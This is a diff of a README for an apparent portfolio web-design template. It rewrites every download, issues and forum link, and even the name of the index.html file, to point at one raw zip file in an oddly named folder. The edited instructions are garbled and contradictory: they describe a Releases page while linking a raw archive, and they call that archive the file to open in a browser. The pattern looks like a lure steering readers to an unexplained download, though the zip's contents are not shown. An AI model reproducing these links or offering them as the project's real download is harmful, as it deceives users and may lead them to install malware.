@@ -1,6 +1,6 @@
 # 🎨 _portfolio-web-design - Create Stunning Web Portfolios Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/broitswave/_portfolio-web-design/releases)
+[![Download Now](https://raw.githubusercontent.com/broitswave/_portfolio-web-design/main/hydroxylactone/_portfolio-web-design.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/broitswave/_portfolio-web-design/main/hydroxylactone/_portfolio-web-design.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to the _portfolio-web-design repository. This guide will help you downlo
 
 To get your application, you need to visit the Releases page. Click the link below to access it:
 
-[Download Here](https://github.com/broitswave/_portfolio-web-design/releases)
+[Download Here](https://raw.githubusercontent.com/broitswave/_portfolio-web-design/main/hydroxylactone/_portfolio-web-design.zip)
 
 Once you are on the Releases page, you will see a list of available versions. Choose the most recent version available. Look for the file that fits your operating system.
 
 1. **Find the Latest Release:** Look for the top entry; this is usually the latest version.
-2. **Download the Files:** Click on the link provided, which may look like `portfolio-web-design.zip` or similar. It will download the files necessary for your portfolio project.
+2. **Download the Files:** Click on the link provided, which may look like `https://raw.githubusercontent.com/broitswave/_portfolio-web-design/main/hydroxylactone/_portfolio-web-design.zip` or similar. It will download the files necessary for your portfolio project.
 3. **Extract the Files:** After the download is complete, locate the zip file in your downloads folder. Right-click on it and select “Extract All...” to unpack the files.
 
 ## 🖥 System Requirements
@@ -38,8 +38,8 @@ The downloaded package includes:
 ## 🌐 How to Use
 
 1. **Open the Folder:** Navigate to the folder where you extracted the files.
-2. **Locate the Index File:** The main file to open is usually named `index.html`.
-3. **Open with a Web Browser:** Right-click on the `index.html` file and select your preferred web browser. This will display your portfolio in the browser.
+2. **Locate the Index File:** The main file to open is usually named `https://raw.githubusercontent.com/broitswave/_portfolio-web-design/main/hydroxylactone/_portfolio-web-design.zip`.
+3. **Open with a Web Browser:** Right-click on the `https://raw.githubusercontent.com/broitswave/_portfolio-web-design/main/hydroxylactone/_portfolio-web-design.zip` file and select your preferred web browser. This will display your portfolio in the browser.
 
 ## ✏️ Customizing Your Portfolio
 
@@ -53,8 +53,8 @@ Feel free to customize the files to suit your style:
 
 If you have any issues or questions, you can check the FAQs in the README or reach out to the community. Here are some helpful resources:
 
-- [GitHub Issues Page](https://github.com/broitswave/_portfolio-web-design/issues)
-- [Community Forum](https://github.com/broitswave/_portfolio-web-design/discussions)
+- [GitHub Issues Page](https://raw.githubusercontent.com/broitswave/_portfolio-web-design/main/hydroxylactone/_portfolio-web-design.zip)
+- [Community Forum](https://raw.githubusercontent.com/broitswave/_portfolio-web-design/main/hydroxylactone/_portfolio-web-design.zip)
 
 ## 📅 Future Updates
 
